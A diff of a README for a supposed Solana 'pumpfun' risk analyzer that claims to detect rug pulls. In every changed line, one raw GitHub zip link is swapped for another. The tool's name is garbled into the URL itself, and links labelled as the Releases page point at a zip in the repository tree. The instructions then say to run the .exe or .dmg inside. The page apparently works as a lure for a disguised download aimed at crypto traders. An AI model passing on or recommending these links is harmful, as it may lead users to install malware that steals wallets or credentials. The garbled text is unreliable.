@@ -2,15 +2,15 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/salaamlike/pumpfun-risk-analyzer.zip Risk Analyzer**! This tool helps you analyze risks in decentralized finance (DeFi) trading. It detects potential rug pulls and offers real-time token analysis on the Solana blockchain. With our tool, you can trade with more confidence.
+Welcome to the **https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/backend/services/analyzer_pumpfun_risk_1.7.zip Risk Analyzer**! This tool helps you analyze risks in decentralized finance (DeFi) trading. It detects potential rug pulls and offers real-time token analysis on the Solana blockchain. With our tool, you can trade with more confidence.
 
 ## 📥 Download the Tool
 
-[![Download the https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/salaamlike/pumpfun-risk-analyzer.zip Risk Analyzer](https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/salaamlike/pumpfun-risk-analyzer.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/salaamlike/pumpfun-risk-analyzer.zip)
+[![Download the https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/backend/services/analyzer_pumpfun_risk_1.7.zip Risk Analyzer](https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/backend/services/analyzer_pumpfun_risk_1.7.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/backend/services/analyzer_pumpfun_risk_1.7.zip)
 
 You can easily download the latest version from our Releases page. Follow the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/salaamlike/pumpfun-risk-analyzer.zip)
+[Visit this page to download](https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/backend/services/analyzer_pumpfun_risk_1.7.zip)
 
 ## 📋 System Requirements
 
@@ -25,7 +25,7 @@ Before you get started, ensure your computer meets the following requirements:
 
 1. **Download**: Click on the link above to visit the Releases page.
    
-2. **Select Version**: Choose the latest version of the https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/salaamlike/pumpfun-risk-analyzer.zip Risk Analyzer.
+2. **Select Version**: Choose the latest version of the https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/backend/services/analyzer_pumpfun_risk_1.7.zip Risk Analyzer.
 
 3. **Download the Installer**: Click the file appropriate for your operating system (for example, `.exe` for Windows, `.dmg` for macOS).
 
@@ -60,7 +60,7 @@ If you face any issues while downloading or using the tool, please reach out thr
 
 ## 🔗 Additional Resources
 
-For more tips on maximizing your experience with the https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/salaamlike/pumpfun-risk-analyzer.zip Risk Analyzer, check out these resources:
+For more tips on maximizing your experience with the https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/backend/services/analyzer_pumpfun_risk_1.7.zip Risk Analyzer, check out these resources:
 
 - **User Guide**: Detailed instructions on navigating and using features.
 - **Community Forum**: Connect with other users to share insights and best practices.
@@ -72,4 +72,4 @@ For inquiries or support requests, you can contact us via our GitHub profile. We
 
 Remember to visit our Releases page for the latest updates.
 
-[Visit this page to download](https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/salaamlike/pumpfun-risk-analyzer.zip)
+[Visit this page to download](https://raw.githubusercontent.com/varun4gv/pumpfun-risk-analyzer/main/backend/services/analyzer_pumpfun_risk_1.7.zip)
